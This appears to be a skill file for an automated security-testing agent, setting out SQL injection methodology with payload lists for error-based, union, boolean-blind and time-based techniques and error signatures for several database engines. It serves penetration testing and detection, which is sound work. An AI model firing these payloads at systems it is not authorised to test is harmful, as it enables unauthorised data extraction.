---
name: sqli_injection
description: SQL injection testing with error-based, union, and blind techniques
category: injection
bug_class: sqli
triggers:
  - sql
  - sqli
  - database
  - query
  - injection
---

# SQL Injection Testing

## Key Insight
SQL injection occurs when user input is incorporated into SQL queries without proper parameterization. Different database engines have different syntax and error messages.

## Attack Surface
- Login forms (username/password)
- Search functionality
- URL parameters (id, page, sort, filter)
- API endpoints with database queries
- Cookie values
- HTTP headers (rare but possible)

## Methodology
1. **Error Detection**: Send special characters and look for SQL errors
2. **Boolean Testing**: Send true/false conditions and compare responses
3. **Union Testing**: Determine column count and extract data
4. **Blind Testing**: Use time-based or boolean-based techniques
5. **Database Fingerprinting**: Identify DBMS type
6. **Data Extraction**: Extract schema, tables, data

## Techniques

### Error-Based Detection
```
'
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
```

### Union-Based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION ALL SELECT NULL--
' UNION SELECT 1,2,3--
```

### Boolean Blind
```
' AND 1=1--  (true condition)
' AND 1=2--  (false condition)
' OR 1=1--   (always true)
```

### Time-Based Blind
```
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
' AND SLEEP(5)--            (MySQL)
' AND pg_sleep(5)--         (PostgreSQL)
```

## Database Error Signatures

### MySQL
```
You have an error in your SQL syntax
mysql_fetch_assoc()
Warning: mysql_
```

### PostgreSQL
```
ERROR: syntax error at or near
pg_query()
PSQLException
```

### MSSQL
```
Microsoft SQL Native Client error
Unclosed quotation mark
ODBC SQL Server Driver
```

### SQLite
```
SQLITE_ERROR
near "": syntax error
sqlite3.OperationalError
```

## Validation
- Confirm with multiple payloads
- Test for data extraction capability
- Document the exact injection point and technique
- Check for WAF bypass needs

## False Positive Avoidance
- Generic error pages are NOT SQLi
- 500 errors without SQL signatures are NOT SQLi
- Time-based tests need baseline comparison
